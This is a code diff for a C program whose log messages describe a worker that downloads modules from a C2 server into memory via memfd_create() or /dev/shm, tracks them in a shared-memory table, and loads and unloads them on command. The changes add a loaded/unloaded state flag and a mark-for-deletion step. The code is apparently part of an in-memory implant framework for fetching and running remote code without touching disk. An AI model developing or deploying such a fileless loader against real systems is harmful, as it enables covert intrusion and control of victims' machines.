@@ -205,6 +205,7 @@ int download_to_RAM(char *download) {
 
 int setMemfdTbl(int shm_fd, char* mname) {
     char path[1024];
+    char mstate[] = "L"; //Loaded
     
 
     log_debug("MemTbl: Populating Index Table");
@@ -224,9 +225,9 @@ int setMemfdTbl(int shm_fd, char* mname) {
 		    log_fatal("MemTble: calloc() failed");
             return 1;
         }
-        push_first(head, shm_fd, path, mname);
+        push_first(head, shm_fd, path, mname, mstate);
     }else{
-        push(head, shm_fd, path, mname);
+        push(head, shm_fd, path, mname, mstate);
     }
     return 0;
 }
@@ -259,7 +260,7 @@ int main (int argc, char **argv) {
 void doWork(){
 
     char urlbuf[255] = {'\0'};
-	int fd, i;
+    int fd, i;
 
     if (checKernel() == 1){
 	    log_info("Worker: memfd_create() support seems to be available.");
@@ -267,7 +268,7 @@ void doWork(){
 	    log_info("Worker: /dev/shm fallback. memfd_create() support is not available.");
     }
 
-	log_debug("Worker: Trying for C2 download...");
+    log_debug("Worker: Trying for C2 download initial modules (if any)...");
 
     for(i = 0; i < sizeof(modules)/sizeof(modules[0]); i++)
     {
@@ -533,14 +534,26 @@ int list_sz(node_t * head) {
     return c;
 }
 
-int mod_name2fd(node_t * head, char * name) {
+int mod_name2fd(node_t * head, char * name, int loaded) {
     node_t * current = head;
     int found=0;
+
     while (current != NULL) {
         if ( strncmp(current->mname, name, sizeof(current->mname)) == 0){
           log_debug("FindMod: found entry %s", current->mname);
-          found=1;
-          break;
+
+          if (loaded){
+              if (strncmp(current->mstate,"U", strlen("U")) == 0 ){
+                  current = current->next;
+                  continue; 
+              }
+              found=1;
+              break;
+              
+          }else{
+            found=1;
+            break;
+          }
         }
         current = current->next;
     }
@@ -576,11 +589,16 @@ void write_modlist(node_t * head, int sock) {
     int n, ret;
     char * entry;
 
+    if (current == NULL) {
+        n = write(sock,"",1);
+        if (n < 0)
+          log_error("Error writing to socket");
+    }
 
     while (current != NULL) {
         entry = calloc(1, MAX_BUF);
 
-		ret = snprintf(entry, MAX_BUF-1, "%d : %s : %s\n", current->fd, current->mpath, current->mname);
+		ret = snprintf(entry, MAX_BUF-1, "%d :(%s): %s : %s\n", current->fd, current->mstate, current->mpath, current->mname);
         if (ret < 0) {
          free(entry);
          continue;
@@ -599,17 +617,18 @@ void write_modlist(node_t * head, int sock) {
 int unload_mod(node_t * head, char * name) {
     int modfd = 0;
     int status = 0;
+    int loaded = 1;
 
-    modfd = mod_name2fd(head, name);
+    modfd = mod_name2fd(head, name, loaded);
     if ( modfd != 0 ){
        log_debug("Worker: Module fd found %d", modfd);
        status = 1;
        log_debug("Worker: Closing OS process fd %d", modfd);
        close(modfd);      // close from OS
        log_debug("Worker: Removing data from memory for fd %d", modfd);
-       delete_mod(head, modfd); // from ShmMemTbl
+       mark_delete_mod(head, modfd); // from ShmMemTbl
     }else{
-        log_debug("Worker: Module fd not found");
+       log_debug("Worker: Module fd not found");
     }
 
     return status;
@@ -637,7 +656,7 @@ int load_mod(node_t * head, char * url) {
 
     CURLU *h;
     CURLUcode uc;
-    char *path;
+    char *path, *cpath=NULL;
 
     h = curl_url();
     if(!h){
@@ -652,17 +671,24 @@ int load_mod(node_t * head, char * url) {
 
     uc = curl_url_get(h, CURLUPART_PATH, &path, 0);
     if(!uc) {
-        log_debug("Path: %s\n", path);
+        log_debug("Path: %s (%d)b\n", path, strlen(path));
+        if (path[0] == '/') {// remove slash
+            cpath = calloc(strlen(path)-1, sizeof(char));
+            memcpy(cpath, path+1, strlen(path)-1);
+        }
     }
 
     log_debug("LoadMod: Downloading %s -> %s", url, path);
     fd = download_to_RAM(url);
     if (fd != 0){
         log_debug("LoadMod: fetched OK, setting Mem table");
-        setMemfdTbl(fd, path );
+
+        setMemfdTbl(fd, cpath );
+
     }
 
 clean:
+    free(cpath);
     curl_free(path);
     curl_url_cleanup(h); /* free url handle */
 
@@ -671,61 +697,39 @@ clean:
 }
 
 //delete a link with given key
-int delete_mod(node_t * head, int fd) {
+int mark_delete_mod(node_t * head, int fd) {
 
    node_t * current = head;
-   node_t * previous = NULL;
    int status = 0;
+   char state[] = "U";
 
    if(head == NULL) {
       return status;
    }
-
-
-   while(current->fd != fd) {
-
-      log_debug("DeleteMod: current->fd: %d", current->fd);
-      
-      //if it is last node
-      if(current->next == NULL) {
-         return status;
-      } else {
-        //store reference to current link
-        previous = current;
-        //move to next link
-        current = current->next;
+   while (current != NULL) {
+      if ( current->fd == fd ){ // found
+          strncpy(current->mstate, state, strlen(state));
       }
-   }
-
-
-   //found a match, update the link
-   if(current == head) {
-       
-     //change first to point to next link
-     head = head->next;
-     status = 1;
-   } else {
-      //bypass the current link
-      previous->next = current->next;
-      status = 1;
+      current = current->next;
    }
 
    return status;
 }
 
-int push_first(node_t * head, int shm_fd, char* path, char* mname) {
+int push_first(node_t * head, int shm_fd, char* path, char* mname, char mstate[]) {
 
     log_debug("ModTable: Adding path %s, strlen(path): %d name: %s strlen(name): %d", path, strlen(path), mname, strlen(mname));
     head->fd = shm_fd;
     strncpy(head->mpath, path, strlen(path));
     strncpy(head->mname, mname, strlen(mname));
+    strncpy(head->mstate, mstate, strlen(mstate));
     head->next = NULL;
     log_debug("ModTable: Added: %s : %s", head->mname, head->mpath);
 
     return 0;
 }
 
-int push(node_t * head, int shm_fd, char* path, char* mname) {
+int push(node_t * head, int shm_fd, char* path, char* mname, char mstate[]) {
     node_t * current = head;
 
     log_debug("ModTable: Adding path %s, strlen(path): %d name: %s strlen(name): %d", path, strlen(path), mname, strlen(mname));
@@ -743,6 +747,7 @@ int push(node_t * head, int shm_fd, char* path, char* mname) {
     current->next->fd = shm_fd;
     strncpy(current->next->mpath, path, strlen(path));
     strncpy(current->next->mname, mname, strlen(mname));
+    strncpy(current->next->mstate, mstate, strlen(mstate));
     current->next->next = NULL;
     log_debug("ModTable: entry: %s : %s", current->mname, current->mpath);
 
